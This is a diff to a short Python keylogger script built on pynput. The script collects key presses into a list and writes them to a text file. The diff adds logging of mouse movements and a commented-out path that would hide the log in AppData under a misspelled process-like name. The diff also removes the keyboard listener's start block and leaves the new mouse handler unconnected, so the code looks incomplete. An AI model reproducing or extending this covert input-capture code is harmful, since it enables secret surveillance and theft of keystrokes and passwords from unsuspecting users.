@@ -1,10 +1,12 @@
 import os
-from pynput.keyboard import Listener
+import logging
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyboardListener
 
 
 qelesat = []
 numerimi = 0
-
+# path=os.environ['appdata'] +\\'porcessmenager.txt'
 path = 'tekst.txt'
 
 
@@ -46,5 +48,8 @@ def write_file(qelesat):
 			elif k.find('qeles'):
 				file.write(k)
 				
-with Listener(on_press=on_press) as listener:
-	listener.join()
+logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+def on_move(x, y):
+    logging.info("Mouse moved to ({0}, {1})".format(x, y))
